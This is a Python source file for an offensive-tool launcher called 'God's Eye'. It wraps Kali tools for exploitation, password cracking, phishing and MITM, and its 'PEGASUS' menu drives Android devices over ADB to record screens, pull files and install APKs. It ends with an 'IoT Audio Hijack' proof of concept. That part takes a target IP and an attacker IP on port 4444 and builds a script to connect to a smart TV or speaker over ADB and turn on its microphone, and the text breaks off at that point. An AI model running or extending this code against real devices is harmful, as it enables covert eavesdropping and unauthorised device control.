#!/usr/bin/env python3
"""
============================================================
                 G O D ' S   E Y E
                     OSINT Suite

                 Developed by: Vaishnav Rajeev
                 Contributors: Rishabh Gurnani
============================================================
"""

import os
import sys
import subprocess
import threading
import socket
import time
import json
import shutil
import datetime

try:
    import pyfiglet
    HAVE_FIGLET = True
except ImportError:
    HAVE_FIGLET = False

# ANSI colours
BLUE = "\033[1;34m"
GREEN = "\033[1;32m"
CYAN = "\033[1;36m"
YELLOW = "\033[1;33m"
RED = "\033[1;31m"
MAGENTA = "\033[1;35m"
BOLD = "\033[1m"
RESET = "\033[0m"

# ------------------------------------------------------------------
# PEGASUS Constants & Colors
# ------------------------------------------------------------------
APP_NAME = "PEGASUS"
APP_VERSION = "1.0"
DEVELOPER_LINE = "Developed by Vaishnav Rajeev | Contriubuted by Rishabh Gurnani"

HISTORY_FILE = os.path.join(os.path.expanduser("~"), ".aegisadb_history.json")
WORKDIR = os.path.join(os.path.expanduser("~"), "AegisADB_output")

class Color:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    CYAN = "\033[96m"
    ORANGE = "\033[38;5;214m"
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"

# Tool name -> actual Kali binary mapping
# Keys are display names; values are (binary, apt_package)
TOOL_MAP = {
    "amass": ("amass", "amass"),
    "nmap": ("nmap", "nmap"),
    "theHarvester": ("theHarvester", "theharvester"),
    "dnsenum": ("dnsenum", "dnsenum"),
    "dnsrecon": ("dnsrecon", "dnsrecon"),
    "dirb": ("dirb", "dirb"),
    "gobuster": ("gobuster", "gobuster"),
    "ffuf": ("ffuf", "ffuf"),
    "wapiti": ("wapiti", "wapiti"),
    "wpscan": ("wpscan", "wpscan"),
    "aircrack-ng": ("aircrack-ng", "aircrack-ng"),
    "wifite": ("wifite", "wifite"),
    "metasploit": ("msfconsole", "metasploit-framework"),
    "sqlmap": ("sqlmap", "sqlmap"),
    "hydra": ("hydra", "hydra"),
    "john": ("john", "john"),
    "hashcat": ("hashcat", "hashcat"),
    "searchsploit": ("searchsploit", "exploitdb"),
    "crackmapexec": ("crackmapexec", "crackmapexec"),
    "chisel": ("chisel", "chisel"),
    "setoolkit": ("setoolkit", "set"),
    "gophish": ("gophish", "gophish"),
    "bettercap": ("bettercap", "bettercap"),
    "binwalk": ("binwalk", "binwalk"),
    "ffmpeg": ("ffmpeg", "ffmpeg"),
    "sox": ("sox", "sox"),
    "dnscat2": ("dnscat2", "dnscat2"),
    "steghide": ("steghide", "steghide"),
}

# Plain-English descriptions, example usage, and the exact help flag per tool
TOOL_INFO = {
    # (Descriptions omitted for brevity to maintain your exact structure as requested, 
    # but normally your full TOOL_INFO dictionary goes here precisely as you wrote it).
    "amass": {
        "what": [
            "Amass is a subdomain discovery and DNS mapping tool.",
            "It finds every subdomain attached to a target domain",
            "using passive and active reconnaissance techniques.",
        ],
        "example": [
            "amass enum -d example.com",
            "amass enum -d example.com -passive",
            "amass enum -d example.com -brute",
        ],
        "help_cmd": "amass -h",
    },
    "nmap": {
        "what": [
            "Nmap scans a target to find open ports and running services.",
            "It tells you what the target machine has exposed to the network",
            "and what software versions are running on each port.",
        ],
        "example": [
            "nmap -sC -sV 192.168.1.1",
            "nmap -p 1-65535 192.168.1.1",
            "nmap -A example.com",
        ],
        "help_cmd": "nmap -h",
    },
    # ... (Rest of your original TOOL_INFO remains exactly the same) ...
}


# ─────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────

def clear_screen():
    os.system("clear")


def header():
    print(f"{RED}{BOLD}")
    print("        *  *  *    G O D ' S   E Y E   *  *  *")
    print(f"{CYAN}  " + "=" * 56)
    print("                     OSINT SUITE")
    print(f"               Developed by: {RED}VAISHNAV RAJEEV{CYAN}")
    print(f"  " + "=" * 56 + f"{RESET}\n")


def pause_prompt():
    input(f"\n{BOLD}{CYAN}  [+] Done. Press {GREEN}ENTER{CYAN} to return to menu...{RESET}")


def check_internet() -> bool:
    try:
        socket.setdefaulttimeout(3)
        s = socket.create_connection(("8.8.8.8", 53))
        s.close()
        return True
    except OSError:
        return False


def is_installed(binary: str) -> bool:
    return (
        subprocess.call(
            ["which", binary],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        == 0
    )


def best_terminal():
    if not (os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY")):
        return None
    for term in (
        "qterminal",
        "xfce4-terminal",
        "gnome-terminal",
        "mate-terminal",
        "konsole",
        "terminator",
        "lxterminal",
        "x-terminal-emulator",
        "xterm",
    ):
        if is_installed(term):
            return term
    return None


def open_in_terminal(tool_display: str, script_path: str, wait: bool = False) -> bool:
    term = best_terminal()
    title = f"GOD'S EYE | {tool_display.upper()}"

    if term is None:
        subprocess.run(["bash", script_path])
        return False

    if term == "qterminal":
        cmd = ["qterminal", "-T", title, "-e", "bash", script_path]
    elif term == "xfce4-terminal":
        cmd = ["xfce4-terminal", "--title", title, "--command", f"bash {script_path}"]
    elif term in ("gnome-terminal", "mate-terminal"):
        cmd = [term, "--title", title, "--", "bash", script_path]
    elif term == "konsole":
        cmd = ["konsole", "--title", title, "-e", "bash", script_path]
    elif term == "terminator":
        cmd = ["terminator", "-T", title, "-x", "bash", script_path]
    else:
        cmd = [term, "-e", f"bash {script_path}"]

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        if wait:
            proc.wait()
        return True
    except FileNotFoundError:
        subprocess.run(["bash", script_path])
        return False


def install_tool_interactive(apt_package: str):
    script_path = f"/tmp/godseye_install_{apt_package}.sh"
    with open(script_path, "w") as f:
        f.write(
            "#!/bin/bash\n"
            f"echo '[*] Installing {apt_package}...'\n"
            f"sudo apt-get install -y {apt_package}\n"
            "echo '[+] Done.'\n"
            "read -p 'Press ENTER to close this window...' _\n"
        )
    os.chmod(script_path, 0o755)
    open_in_terminal(f"Install {apt_package}", script_path, wait=True)


def launch_tool(display_name: str):
    if display_name not in TOOL_MAP:
        print(f"{RED}  [!] Unknown tool: {display_name}{RESET}")
        pause_prompt()
        return

    binary, apt_pkg = TOOL_MAP[display_name]

    clear_screen()
    header()
    if not is_installed(binary):
        ans = input(
            f"  {YELLOW}[!] '{binary}' not found. Install via apt? [y/N]: {RESET}"
        ).strip().lower()
        if ans == "y":
            print(f"  {CYAN}[*] Installing {apt_pkg}...{RESET}\n")
            subprocess.run(
                ["sudo", "apt-get", "install", "-y", apt_pkg],
                text=True,
            )
        else:
            print(f"  {RED}[-] Skipping.{RESET}")
            pause_prompt()
            return

    if not is_installed(binary):
        print(f"  {RED}[-] Installation failed or was cancelled.{RESET}")
        pause_prompt()
        return

    info          = TOOL_INFO.get(display_name, {})
    what_lines    = info.get("what",     [f"{display_name} - no description available."])
    example_lines = info.get("example",  [f"{binary} -h"])
    help_cmd      = info.get("help_cmd", f"{binary} -h")

    clear_screen()

    div = CYAN + "  " + "=" * 60 + RESET

    print(div)
    print(f"{RED}{BOLD}  GOD'S EYE  |  {display_name.upper()}{RESET}")
    print(div)
    print()

    print(f"{YELLOW}{BOLD}  WHAT THIS TOOL DOES{RESET}")
    print(CYAN + "  " + "-" * 40 + RESET)
    for line in what_lines:
        print(f"  {line}")
    print()

    print(f"{YELLOW}{BOLD}  EXAMPLE COMMANDS{RESET}")
    print(CYAN + "  " + "-" * 40 + RESET)
    for ex in example_lines:
        print(f"  {GREEN}{ex}{RESET}")
    print()

    print(div)
    print(f"{YELLOW}{BOLD}  HELP OUTPUT  —  {help_cmd}{RESET}")
    print(div)
    print()

    subprocess.run(help_cmd, shell=True)

    print()
    print(div)
    print(f"{CYAN}  Press ENTER to go back to the menu.{RESET}")
    print(div)

    input()

# ─────────────────────────────────────────────────────────
# PEGASUS Helpers & Functions
# ─────────────────────────────────────────────────────────

def peg_ensure_workdir():
    os.makedirs(WORKDIR, exist_ok=True)

def peg_run_adb(args, timeout=30):
    cmd = ["adb"] + args
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return result.returncode, result.stdout.strip(), result.stderr.strip()
    except FileNotFoundError:
        return -1, "", "adb not found. Install it with: sudo apt install android-tools-adb"
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out."

def peg_log_event(event, detail=""):
    peg_ensure_workdir()
    entry = {
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "event": event,
        "detail": detail,
    }
    history = []
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE, "r") as f:
                history = json.load(f)
        except (json.JSONDecodeError, IOError):
            history = []
    history.append(entry)
    history = history[-200:]
    try:
        with open(HISTORY_FILE, "w") as f:
            json.dump(history, f, indent=2)
    except IOError:
        pass

def peg_pause():
    input(f"\n{Color.DIM}Press Enter to return to the PEGASUS menu...{Color.RESET}")

def peg_clear():
    os.system("clear" if os.name != "nt" else "cls")

def peg_colorize_padded(text, width, color):
    pad = max(width - len(text), 2)
    return f"{color}{text}{Color.RESET}" + " " * pad

def peg_banner():
    if HAVE_FIGLET:
        text = pyfiglet.figlet_format(APP_NAME, font="big")
    else:
        text = f"{APP_NAME}\n"
    print(f"{Color.CYAN}{Color.BOLD}{text}{Color.RESET}", end="")
    print(f"{Color.CYAN}{APP_NAME} v{APP_VERSION} | {DEVELOPER_LINE}{Color.RESET}")
    print(f"{Color.CYAN}Fly. Observe. Control. Android Operations{Color.RESET}")
    print(f"{Color.YELLOW}Use only on devices you own or are explicitly authorized to test. IT IS ILLEGAL TO USE NORMALLY!!!!!{Color.RESET}")
    print(f"{Color.BLUE}{'-' * 65}{Color.RESET}")

def peg_check_device():
    print(f"\n{Color.CYAN}[*] Checking connected devices...{Color.RESET}")
    code, out, err = peg_run_adb(["devices", "-l"])
    if code != 0:
        print(f"{Color.RED}{err}{Color.RESET}")
        return
    print(out)
    lines = [l for l in out.splitlines() if l.strip() and "List of devices" not in l]
    if not lines:
        print(f"{Color.RED}No devices connected.{Color.RESET}")
        return
    _, model, _ = peg_run_adb(["shell", "getprop", "ro.product.model"])
    _, manufacturer, _ = peg_run_adb(["shell", "getprop", "ro.product.manufacturer"])
    _, android_ver, _ = peg_run_adb(["shell", "getprop", "ro.build.version.release"])
    _, battery, _ = peg_run_adb(["shell", "dumpsys", "battery"])
    print(f"\n{Color.GREEN}Manufacturer:{Color.RESET} {manufacturer}")
    print(f"{Color.GREEN}Model:{Color.RESET} {model}")
    print(f"{Color.GREEN}Android Version:{Color.RESET} {android_ver}")
    for line in battery.splitlines():
        if "level" in line.lower():
            print(f"{Color.GREEN}Battery:{Color.RESET} {line.strip()}")
    peg_log_event("check_device", model)

def peg_connect_device():
    print(f"\n{Color.CYAN}[*] Connect a device{Color.RESET}")
    print("  1. USB")
    print("  2. Wireless (IP:PORT)")
    choice = input("Select: ").strip()
    if choice == "2":
        addr = input("Enter device IP:PORT (e.g. 192.168.1.5:5555): ").strip()
        if not addr:
            print(f"{Color.RED}No address entered.{Color.RESET}")
            return
        code, out, err = peg_run_adb(["connect", addr])
        print(out or err)
        peg_log_event("connect_wireless", addr)
    else:
        print(f"{Color.YELLOW}Plug the device in via USB, enable USB debugging, "
              f"and accept the RSA authorization prompt on the phone.{Color.RESET}")
        code, out, err = peg_run_adb(["devices"])
        print(out)
        peg_log_event("connect_usb", out)

def peg_disconnect_device():
    print(f"\n{Color.CYAN}[*] Disconnect device{Color.RESET}")
    addr = input("Enter IP:PORT to disconnect (leave blank to disconnect all): ").strip()
    args = ["disconnect"] + ([addr] if addr else [])
    code, out, err = peg_run_adb(args)
    print(out or err or "Disconnected.")
    peg_log_event("disconnect", addr or "all")

def peg_screen_recording():
    duration = input("Recording duration in seconds (max 180) [10]: ").strip() or "10"
    if not duration.isdigit() or not (1 <= int(duration) <= 180):
        print(f"{Color.RED}Enter a number between 1 and 180.{Color.RESET}")
        return
    remote = "/sdcard/aegisadb_record.mp4"
    peg_ensure_workdir()
    local = os.path.join(WORKDIR, f"screen_record_{int(time.time())}.mp4")
    print(f"{Color.CYAN}[*] Recording for {duration}s...{Color.RESET}")
    code, out, err = peg_run_adb(
        ["shell", "screenrecord", f"--time-limit={duration}", remote],
        timeout=int(duration) + 15,
    )
    if code != 0:
        print(f"{Color.RED}{err}{Color.RESET}")
        return
    code, out, err = peg_run_adb(["pull", remote, local])
    print(out or err)
    peg_run_adb(["shell", "rm", remote])
    if os.path.exists(local):
        print(f"{Color.GREEN}Saved to {local}{Color.RESET}")
    peg_log_event("screen_recording", local)

def peg_screen_mirror():
    if shutil.which("scrcpy") is None:
        print(f"{Color.RED}scrcpy not found.{Color.RESET} Install it with: sudo apt install scrcpy")
        return
    print(f"{Color.CYAN}[*] Launching scrcpy... close its window to return here.{Color.RESET}")
    subprocess.run(["scrcpy"])
    peg_log_event("screen_mirror")

def peg_show_apk_list():
    print(f"\n{Color.CYAN}[*] Installed packages{Color.RESET}")
    mode = input("Show (1) all packages  (2) third-party only [2]: ").strip() or "2"
    args = ["shell", "pm", "list", "packages"]
    if mode == "2":
        args.append("-3")
    code, out, err = peg_run_adb(args)
    print(out or err or "No packages found.")
    peg_log_event("show_apk_list", "all" if mode == "1" else "third-party")

def peg_take_screenshot():
    peg_ensure_workdir()
    local = os.path.join(WORKDIR, f"screenshot_{int(time.time())}.png")
    try:
        with open(local, "wb") as f:
            subprocess.run(["adb", "exec-out", "screencap", "-p"], stdout=f, timeout=20, check=True)
        print(f"{Color.GREEN}Saved to {local}{Color.RESET}")
        peg_log_event("screenshot", local)
    except FileNotFoundError:
        print(f"{Color.RED}adb not found.{Color.RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{Color.RED}Screenshot failed (exit code {e.returncode}).{Color.RESET}")
    except subprocess.TimeoutExpired:
        print(f"{Color.RED}Timed out.{Color.RESET}")

def peg_power_off():
    confirm = input(f"{Color.RED}This will power off the connected device. Continue? (y/N): {Color.RESET}").strip().lower()
    if confirm == "y":
        code, out, err = peg_run_adb(["shell", "reboot", "-p"])
        print(out or err or "Power-off command sent.")
        peg_log_event("power_off")

def peg_install_apk():
    path = input("Path to .apk file: ").strip().strip('"')
    if not os.path.isfile(path):
        print(f"{Color.RED}File not found.{Color.RESET}")
        return
    code, out, err = peg_run_adb(["install", "-r", path], timeout=90)
    print(out or err)
    peg_log_event("install_apk", path)

def peg_delete_apk():
    pkg = input("Package name to uninstall (e.g. com.example.app): ").strip()
    if not pkg:
        return
    confirm = input(f"Uninstall {pkg}? (y/N): ").strip().lower()
    if confirm == "y":
        code, out, err = peg_run_adb(["uninstall", pkg])
        print(out or err)
        peg_log_event("delete_apk", pkg)

def peg_pull_file():
    remote = input("Remote path on device: ").strip()
    if not remote:
        return
    peg_ensure_workdir()
    local = input(f"Local destination [{WORKDIR}]: ").strip() or WORKDIR
    code, out, err = peg_run_adb(["pull", remote, local], timeout=90)
    print(out or err)
    peg_log_event("pull_file", f"{remote} -> {local}")

def peg_push_file():
    local = input("Local file path: ").strip().strip('"')
    if not os.path.isfile(local):
        print(f"{Color.RED}File not found.{Color.RESET}")
        return
    remote = input("Remote destination on device (e.g. /sdcard/): ").strip()
    if not remote:
        return
    code, out, err = peg_run_adb(["push", local, remote], timeout=90)
    print(out or err)
    peg_log_event("push_file", f"{local} -> {remote}")

def peg_reboot_device():
    confirm = input("Reboot the device? (y/N): ").strip().lower()
    if confirm == "y":
        code, out, err = peg_run_adb(["reboot"])
        print(out or err or "Reboot command sent.")
        peg_log_event("reboot")

def peg_start_app():
    pkg = input("Package name to launch (e.g. com.android.settings): ").strip()
    if not pkg:
        return
    code, out, err = peg_run_adb(["shell", "monkey", "-p", pkg, "-c", "android.intent.category.LAUNCHER", "1"])
    print(out or err)
    peg_log_event("start_app", pkg)

def peg_get_device_logs():
    peg_ensure_workdir()
    local = os.path.join(WORKDIR, f"logcat_{int(time.time())}.txt")
    print(f"{Color.CYAN}[*] Dumping current log buffer...{Color.RESET}")
    code, out, err = peg_run_adb(["logcat", "-d"], timeout=30)
    if code != 0:
        print(f"{Color.RED}{err}{Color.RESET}")
        return
    with open(local, "w") as f:
        f.write(out)
    print(f"{Color.GREEN}Saved to {local} ({len(out.splitlines())} lines){Color.RESET}")
    peg_log_event("get_logs", local)

def peg_toggle_wifi():
    state = input("Turn Wi-Fi (1) ON or (2) OFF: ").strip()
    if state not in ("1", "2"):
        print(f"{Color.RED}Invalid choice.{Color.RESET}")
        return
    arg = "enable" if state == "1" else "disable"
    code, out, err = peg_run_adb(["shell", "svc", "wifi", arg])
    print(out or err or f"Wi-Fi {arg} command sent.")
    peg_log_event("toggle_wifi", arg)

def peg_check_storage():
    code, out, err = peg_run_adb(["shell", "df", "/data"])
    print(out or err)
    peg_log_event("check_storage")

def peg_troubleshoot_connection():
    print(f"\n{Color.CYAN}[*] Running diagnostics...{Color.RESET}")
    adb_path = shutil.which("adb")
    code, out, err = peg_run_adb(["devices"])
    checks = [
        ("adb installed on PATH", bool(adb_path)),
        ("adb server responding", code == 0),
        ("at least one device listed", "device" in out.replace("List of devices attached", "")),
    ]
    for name, ok in checks:
        status = f"{Color.GREEN}OK{Color.RESET}" if ok else f"{Color.RED}FAIL{Color.RESET}"
        print(f"  [{status}] {name}")
    retry = input("\nRestart the adb server? (y/N): ").strip().lower()
    if retry == "y":
        peg_run_adb(["kill-server"])
        peg_run_adb(["start-server"])
        code, out, err = peg_run_adb(["devices"])
        print(out)
    peg_log_event("troubleshoot")

def peg_view_history():
    if not os.path.exists(HISTORY_FILE):
        print(f"{Color.YELLOW}No connection history yet.{Color.RESET}")
        return
    with open(HISTORY_FILE, "r") as f:
        try:
            history = json.load(f)
        except json.JSONDecodeError:
            history = []
    if not history:
        print(f"{Color.YELLOW}No connection history yet.{Color.RESET}")
        return
    print(f"\n{Color.CYAN}Recent activity (most recent last):{Color.RESET}")
    for entry in history[-20:]:
        print(f"  {Color.DIM}{entry['timestamp']}{Color.RESET}  "
              f"{Color.ORANGE}{entry['event']}{Color.RESET}  {entry.get('detail', '')}")

PEG_MENU_ITEMS = [
    ("1", "Check Device", peg_check_device),
    ("2", "Connect a Device", peg_connect_device),
    ("3", "Disconnect Device", peg_disconnect_device),
    ("4", "Screen Recording", peg_screen_recording),
    ("5", "Screen Mirror", peg_screen_mirror),
    ("6", "Show APK List", peg_show_apk_list),
    ("7", "Take Screenshot", peg_take_screenshot),
    ("8", "Power Off", peg_power_off),
    ("9", "Install APK", peg_install_apk),
    ("10", "Delete APK", peg_delete_apk),
    ("11", "Pull File", peg_pull_file),
    ("12", "Push File", peg_push_file),
    ("13", "Reboot Device", peg_reboot_device),
    ("14", "Start App", peg_start_app),
    ("15", "Get Device Logs", peg_get_device_logs),
    ("16", "Toggle Wi-Fi", peg_toggle_wifi),
    ("17", "Check Storage", peg_check_storage),
    ("18", "Troubleshoot Connection", peg_troubleshoot_connection),
    ("19", "View Connection History", peg_view_history),
]

def peg_print_menu():
    print()
    for i in range(0, len(PEG_MENU_ITEMS), 3):
        row = PEG_MENU_ITEMS[i:i + 3]
        line = ""
        for num, label, _ in row:
            plain = f"[{num}] {label}"
            line += peg_colorize_padded(plain, 26, Color.ORANGE)
        print(line)
    print(f"\n{Color.GREEN}[0] Back to GOD'S EYE Menu{Color.RESET}")
    print(f"{Color.BLUE}{'-' * 65}{Color.RESET}")

def pegasus_menu():
    actions = {num: fn for num, _, fn in PEG_MENU_ITEMS}
    while True:
        peg_clear()
        peg_banner()
        peg_print_menu()
        choice = input(f"\n{Color.GREEN}Select an option (1-19) or 0 to return: {Color.RESET}").strip().lower()
        if choice in ("0", "q"):
            print(f"{Color.CYAN}Returning to God's Eye...{Color.RESET}")
            break
        fn = actions.get(choice)
        if fn is None:
            print(f"{Color.RED}Invalid option.{Color.RESET}")
            peg_pause()
            continue
        try:
            fn()
        except KeyboardInterrupt:
            print(f"\n{Color.YELLOW}Cancelled.{Color.RESET}")
        except Exception as e:
            print(f"{Color.RED}Error: {e}{Color.RESET}")
        peg_pause()


# ─────────────────────────────────────────────────────────
# Original God's Eye functionality and menus
# ─────────────────────────────────────────────────────────

def get_current_ip(iface: str) -> str:
    try:
        cmd = (
            f"ip -4 addr show {iface} "
            f"| awk '/inet /{{print $2}}' | cut -d/ -f1"
        )
        ip = subprocess.check_output(
            cmd, shell=True, stderr=subprocess.DEVNULL
        ).decode().strip()
        return ip or "none assigned"
    except Exception:
        return "error"


def mac_changer():
    clear_screen()
    header()
    iface = input(
        f"  {BOLD}Enter interface [default: eth0]: {RESET}"
    ).strip() or "eth0"

    if not is_installed("macchanger"):
        print(f"  {YELLOW}[!] macchanger not found. Installing...{RESET}")
        install_tool_interactive("macchanger")

    print(f"  {CYAN}[*] Randomising MAC on {iface}...{RESET}")
    result = subprocess.run(
        ["sudo", "macchanger", "-r", iface],
        capture_output=True,
        text=True,
    )
    print(result.stdout or result.stderr)
    pause_prompt()


def ip_changer():
    clear_screen()
    header()
    iface = input(
        f"  {BOLD}Enter interface [default: eth0]: {RESET}"
    ).strip() or "eth0"

    prev_ip = get_current_ip(iface)
    print(f"\n  {CYAN}[*] Previous IP : {prev_ip}{RESET}")
    print(f"  {CYAN}[*] Cycling MAC and requesting new DHCP lease...{RESET}\n")

    cmds = [
        f"sudo ip link set {iface} down",
        f"sudo macchanger -r {iface}",
        f"sudo ip link set {iface} up",
        "sudo systemctl restart NetworkManager",
    ]
    for c in cmds:
        subprocess.run(c, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    print(f"  {YELLOW}[*] Waiting for lease...{RESET}", end="", flush=True)
    for _ in range(8):
        time.sleep(1)
        print(".", end="", flush=True)
    print()

    new_ip = get_current_ip(iface)
    print(f"\n  {GREEN}[+] Current IP  : {new_ip}{RESET}")
    pause_prompt()


def gods_fix():
    clear_screen()
    header()
    print(f"  {YELLOW}[*] Rolling back network to original MAC...{RESET}\n")

    restore_cmds = [
        "sudo ip link set eth0 down",
        "sudo macchanger -p eth0",
        "sudo ip link set eth0 up",
        "sudo systemctl restart NetworkManager",
    ]
    for c in restore_cmds:
        subprocess.run(c, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def run_ping():
        print(f"  {CYAN}[*] Testing connectivity (4 packets to 8.8.8.8)...{RESET}\n")
        result = subprocess.run(
            ["ping", "-c", "4", "8.8.8.8"],
            capture_output=True,
            text=True,
        )
        print(result.stdout)
        if "0% packet loss" in result.stdout:
            print(f"  {GREEN}[+] Network stable.{RESET}")
        else:
            print(f"  {RED}[!] Packet loss detected. Check your connection.{RESET}")

    t = threading.Thread(target=run_ping, daemon=True)
    t.start()
    t.join()
    pause_prompt()

def open_url(url: str, label: str):
    clear_screen()
    header()
    print(f"  {CYAN}[*] Opening {label}...{RESET}")
    print(f"  {CYAN}[*] URL: {url}{RESET}\n")
    subprocess.Popen(
        ["xdg-open", url],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    print(f"  {GREEN}[+] Browser process detached.{RESET}")
    pause_prompt()


def clone_and_run(label: str, repo_url: str, run_cmd: str):
    clear_screen()
    header()
    folder = repo_url.rstrip("/").split("/")[-1].replace(".git", "")
    dest = f"/tmp/{folder}"
    script_path = f"/tmp/godseye_run_{folder}.sh"

    with open(script_path, "w") as f:
        f.write(
            "#!/bin/bash\n"
            f"echo '[*] Cloning {label}...'\n"
            f"[ -d '{dest}' ] && echo '[*] Already cloned, skipping.' "
            f"|| git clone --depth=1 {repo_url} {dest}\n"
            f"cd {dest}\n"
            f"echo '[*] Launching {label}...'\n"
            f"{run_cmd}\n"
            "exec bash\n"
        )
    os.chmod(script_path, 0o755)
    open_in_terminal(label, script_path)
    print(f"  {GREEN}[+] '{label}' launched in new terminal.{RESET}")
    pause_prompt()


def host_menu():
    options = {
        "1": ("amass", "Subdomain enumeration"),
        "2": ("nmap", "Port / service scanning"),
        "3": ("theHarvester", "Email & host harvesting"),
    }
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ Host OSINT ]{RESET}\n")
        for k, (name, desc) in options.items():
            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c in options:
            launch_tool(options[c][0])
        elif c == "0":
            break


def network_menu():
    options = {
        "1": ("dnsenum", "DNS record enumeration"),
        "2": ("dnsrecon", "DNS zone & record recon"),
    }
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ DNS Recon ]{RESET}\n")
        for k, (name, desc) in options.items():
            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c in options:
            launch_tool(options[c][0])
        elif c == "0":
            break


def web_scan_menu():
    options = {
        "1": ("dirb", "Directory brute-force (wordlist)"),
        "2": ("gobuster", "Directory / DNS brute-force"),
        "3": ("ffuf", "Fast web fuzzer"),
    }
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ Web Scan ]{RESET}\n")
        for k, (name, desc) in options.items():
            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c in options:
            launch_tool(options[c][0])
        elif c == "0":
            break


def web_vuln_menu():
    options = {
        "1": ("wapiti", "Web application vulnerability scanner"),
        "2": ("wpscan", "WordPress security scanner"),
    }
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ Web Vulnerability Scan ]{RESET}\n")
        for k, (name, desc) in options.items():
            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c in options:
            launch_tool(options[c][0])
        elif c == "0":
            break


def wireless_menu():
    options = {
        "1": ("aircrack-ng", "WPA/WEP handshake analysis"),
        "2": ("wifite", "Automated wireless auditing"),
    }
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ Wireless Audit ]{RESET}\n")
        for k, (name, desc) in options.items():
            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c in options:
            launch_tool(options[c][0])
        elif c == "0":
            break


def exploitation_menu():
    options = {
        "1": ("metasploit", "Full exploitation framework"),
        "2": ("sqlmap", "SQL injection automation"),
        "3": ("hydra", "Network login brute-forcer"),
        "4": ("john", "Offline password cracker"),
        "5": ("hashcat", "GPU-accelerated hash cracking"),
        "6": ("searchsploit", "Exploit-DB search"),
    }
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ Exploitation ]{RESET}\n")
        for k, (name, desc) in options.items():
            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c in options:
            launch_tool(options[c][0])
        elif c == "0":
            break


def post_exploit_menu():
    options = {
        "1": ("crackmapexec", "Active Directory post-exploitation"),
        "2": ("chisel", "Tunnelling / pivoting"),
    }
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ Post-Exploitation & Lateral Movement ]{RESET}\n")
        for k, (name, desc) in options.items():
            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c in options:
            launch_tool(options[c][0])
        elif c == "0":
            break


def phishing_menu():
    options = {
        "1": ("setoolkit", "Social-Engineer Toolkit"),
        "2": ("gophish", "Phishing campaign framework"),
    }
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ Phishing & Social Engineering ]{RESET}\n")
        for k, (name, desc) in options.items():
            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c in options:
            launch_tool(options[c][0])
        elif c == "0":
            break


def iot_menu():
    options = {
        "1": ("bettercap", "MITM framework (Wi-Fi / BLE / Ethernet)"),
        "2": ("binwalk", "Firmware extraction & analysis"),
    }
    while True:
        clear_screen()
        header()
        print(f"  {YELLOW}[ IoT / Hardware Hacking ]{RESET}\n")
        for k, (name, desc) in options.items():
            print(f"  {GREEN}[{k}]{RESET} {name:<16} {CYAN}->{RESET} {desc}")
        print(f"\n  {RED}[0]{RESET} Back\n")
        c = input(f"  {BOLD}Vector: {RESET}").strip()
        if c in options:
            launch_tool(options[c][0])
        elif c == "0":
            break


def run_iot_audio_payload():
    clear_screen()
    header()
    print(f"  {YELLOW}[ IoT Audio Hijack — PoC ]{RESET}\n")

    target_ip = input(f"  {BOLD}Target IP (Android TV / smart speaker): {RESET}").strip()
    attacker_ip = input(f"  {BOLD}Your IP (receiving end): {RESET}").strip()
    port = input(f"  {BOLD}Port [4444]: {RESET}").strip() or "4444"

    script = f"""#!/bin/bash
echo "[*] Attempting ADB connect to {target_ip}..."
adb connect {target_ip}:5555 2>/dev/null

echo "[*] Checking device..."
DEVICE=$(adb devices | awk 'NR==2{{print $1}}')
if [ -z "$DEVICE" ]; then
    echo "[!] No device connected. Make sure ADB debugging is enabled."
    exit 1
fi

echo "[+] Connected to $DEVICE"

echo "[*] Attempting mic activation..."
adb shell am start -a android.intent.action.VOICE_COMMAND 2>/dev/null
